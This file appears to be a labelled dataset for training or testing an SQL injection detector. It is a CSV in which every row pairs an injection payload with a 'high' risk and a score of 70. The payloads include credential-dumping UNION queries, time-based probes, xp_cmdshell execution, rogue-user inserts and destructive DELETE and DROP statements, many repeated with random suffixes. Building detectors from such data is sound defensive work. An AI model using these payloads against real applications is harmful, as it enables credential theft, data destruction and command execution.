query,risk,score
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # vfrg4,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
'; DROP PROCEDURE admin_login-- LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 -- 7it9,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; SELECT pg_sleep(5); -- -- 8o8q,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- yw9n",high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; WAITFOR DELAY '0:0:5'-- -- 5e40,high,70
' OR 1=1; DROP TABLE temp; -- /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
"' UNION ALL SELECT username, password FROM users -- 9i4e",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # d7o3w,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users -- 10zr",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- faau,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # rk3u3,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # kj8xq,high,70
"' UNION ALL SELECT username, password FROM users # r7czz",high,70
'; WAITFOR DELAY '0:0:5'-- # w55pg,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
"' UNION ALL SELECT username, password FROM users # gz2m3",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"' UNION ALL SELECT username, password FROM users # 9v83v",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- g6z4",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- wxvt,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 59yw,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- 4d20,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
"' UNION ALL SELECT username, password FROM users # b3mx1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 7jahq",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # pcyyk,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1",high,70
'; SELECT pg_sleep(5); -- -- pm72,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 7pmzp,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- 7ngo,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 -- 79ah,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # tfb6u",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- # wo8rx,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
'; DELETE FROM users; /**/ -- l45h,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ov40",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
' OR 1=1; DROP TABLE temp; -- # qi5mf,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- avv1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 -- gch1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
' OR 1=1; DROP TABLE temp; -- # t781a,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
'; DELETE FROM users; /**/ # t1m8i,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
'; DROP PROCEDURE admin_login-- # gsp89,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; DELETE FROM users; /**/ # w939i,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 0tewh",high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # ui8ai",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # gziy5",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # p84vi,high,70
'; DELETE FROM users; /**/ -- qpdh,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # i23ou,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- rq0x,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ygdl,high,70
'; DROP PROCEDURE admin_login-- -- wmpg,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # hkop3",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- d223",high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # jgtge",high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # w5ysg,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # qlc6w,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # nt96o,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- mrfm",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
' OR 1=1; DROP TABLE temp; -- -- 4ed9,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # ik971",high,70
"' UNION ALL SELECT username, password FROM users -- qfv7",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- u4l4",high,70
' OR 1=1; DROP TABLE temp; -- /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; DROP PROCEDURE admin_login-- # 4q041,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- /**/ # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
"' UNION ALL SELECT username, password FROM users -- xnk6",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
' OR 1=1; DROP TABLE temp; -- /**/ # ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ggvi,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 4klw,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # kkhjp",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # z5sc6",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
'; WAITFOR DELAY '0:0:5'-- # ynxrg,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
'; WAITFOR DELAY '0:0:5'-- -- 6wtw,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # liatm",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # n9xup",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # lsl0v",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- -- mb9r,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- jujs",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- xgf5,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
' OR 1=1; DROP TABLE temp; -- -- son3,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; SELECT pg_sleep(5); -- # ktjef,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- e7hw,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1",high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # ke373",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"' UNION ALL SELECT username, password FROM users -- shjh",high,70
'; SELECT pg_sleep(5); -- # 2yxo9,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; SELECT pg_sleep(5); -- # si57j,high,70
'; WAITFOR DELAY '0:0:5'-- -- zi0b,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # otmbz,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- -- a9dr,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- iz6j",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- # unpzs,high,70
'; SELECT pg_sleep(5); -- # jrr2j,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # rr822",high,70
'; WAITFOR DELAY '0:0:5'-- # i5u1e,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- xhnh,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- z4r3",high,70
'; DROP PROCEDURE admin_login-- -- 8rbz,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
'; SELECT pg_sleep(5); -- -- g84a,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
'; DELETE FROM users; /**/ # zwjlp,high,70
"' UNION ALL SELECT username, password FROM users -- vjvi",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # g49n0,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ogg9",high,70
'; DELETE FROM users; /**/ -- iv98,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- # thizq,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # huhvs,high,70
'; WAITFOR DELAY '0:0:5'-- -- t4f2,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # narze",high,70
' OR SLEEP(5) AND '1'='1 -- x0ds,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # qkest,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # w785p",high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
'; SELECT pg_sleep(5); -- # 47yit,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- rofb",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1",high,70
"' UNION ALL SELECT username, password FROM users -- uqhe",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; WAITFOR DELAY '0:0:5'-- -- e5b6,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # bqilv",high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- x4q4,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # zgon8,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- 1xba,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 88m0",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # a2gke,high,70
'; DELETE FROM users; /**/ -- s9x4,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # gz5gg",high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- o8ln",high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- xdoz,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- # 88n99,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- # 0wxet,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # bcv86",high,70
' OR 1=1; DROP TABLE temp; -- -- nqbw,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # zkkp7,high,70
